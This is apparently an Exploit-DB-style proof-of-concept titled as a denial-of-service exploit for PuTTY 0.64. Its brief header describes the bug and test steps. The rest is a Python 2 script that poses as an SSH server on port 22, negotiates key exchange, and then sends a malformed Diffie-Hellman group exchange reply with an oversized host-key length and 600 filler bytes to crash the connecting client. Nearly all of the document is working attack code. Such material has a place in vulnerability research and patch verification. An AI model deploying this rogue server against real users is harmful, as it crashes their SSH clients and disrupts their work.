# Exploit title: putty v0.64 denial of service vulnerability
# Date: 5-6-2015
# Vendor homepage: http://www.chiark.greenend.org.uk
# Software Link: http://the.earth.li/~sgtatham/putty/latest/x86/putty-0.64-installer.exe
# Version: 0.64
# Author: 3unnym00n
 
# Details:
# --------
# when doing the ssh dh group exchange old style, if the server send a malformed dh group exchange reply, can lead the putty crash
 
# Tested On: win7, xp
# operating steps: run the py, then execute : "D:\programfile\PuTTYlatest\putty.exe" -ssh  root@127.0.0.1
 
'''
 
 
import socket
import struct
 
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.bind(('127.0.0.1', 22))
soc.listen(1)
client, addr = soc.accept()
 
## do banner exchange
## send server banner
client.send('SSH-2.0-paramiko_1.16.0\r\n')
## recv client banner
client_banner = ''
while True:
    data = client.recv(1)
    if data == '\x0a':
        break
    client_banner += data
 
print 'the client banner is: %s'%client_banner.__repr__()
 
## do key exchange
## recv client algorithms
str_pl = client.recv(4)
pl = struct.unpack('>I', str_pl)[0]
client.recv(pl)
## send server algorithms
client.send('000001b4091464f9a91726b1efcfa98bed8e93bbd93d000000596469666669652d68656c6c6d616e2d67726f75702d65786368616e67652d736861312c6469666669652d68656c6c6d616e2d67726f757031342d736861312c6469666669652d68656c6c6d616e2d67726f7570312d73686131000000077373682d727361000000576165733132382d6374722c6165733235362d6374722c6165733132382d6362632c626c6f77666973682d6362632c6165733235362d6362632c336465732d6362632c617263666f75723132382c617263666f7572323536000000576165733132382d6374722c6165733235362d6374722c6165733132382d6362632c626c6f77666973682d6362632c6165733235362d6362632c336465732d6362632c617263666f75723132382c617263666f75723235360000002b686d61632d736861312c686d61632d6d64352c686d61632d736861312d39362c686d61632d6d64352d39360000002b686d61632d736861312c686d61632d6d64352c686d61632d736861312d39362c686d61632d6d64352d3936000000046e6f6e65000000046e6f6e6500000000000000000000000000000000000000000000'.decode('hex'))
 
 
## do dh key exchange
## recv dh group exchange request
str_pl = client.recv(4)
pl = struct.unpack('>I', str_pl)[0]
client.recv(pl)
## send dh group exchange group
client.send('00000114081f0000010100c038282de061be1ad34f31325efe9b1d8520db14276ceb61fe3a2cb8d77ffe3b9a067505205bba8353847fd2ea1e2471e4294862a5d4c4f9a2b80f9da0619327cdbf2eb608b0b5549294a955972aa3512821b24782dd8ab97b53aab04b48180394abfbc4dcf9b819fc0cb5ac1275ac5f16ec378163501e4b27d49c67f660333888f1d503b96fa9c6c880543d8b5f04d70fe508ffca161798ad32015145b8e9ad43aab48ada81fd1e5a8ea7711a8ff57ec7c4c081b47fab0c2e9fa468e70dd6700f3412224890d5e99527a596ce635195f3a6d35e563bf4892df2c79c809704411018d919102d12cb112ce1e66ebf5db9f409f6c82a6a6e1e21e23532cf24a6e300000001020000000000000000'.decode('hex'))
 
## recv dh group exchange init
str_pl = client.recv(4)
pl = struct.unpack('>I', str_pl)[0]
client.recv(pl)
 
## send dh group exchange reply
dh_gex_reply_msg = '\x00\x00\x02\x3c' ## pl
dh_gex_reply_msg += '\x09' ## padding len
dh_gex_reply_msg += '\x21' ## dh gex reply
dh_gex_reply_msg += '\x00\x00\xff\xff' ## dh host key len
dh_gex_reply_msg += 'A'*600
 
client.sendall(dh_gex_reply_msg)
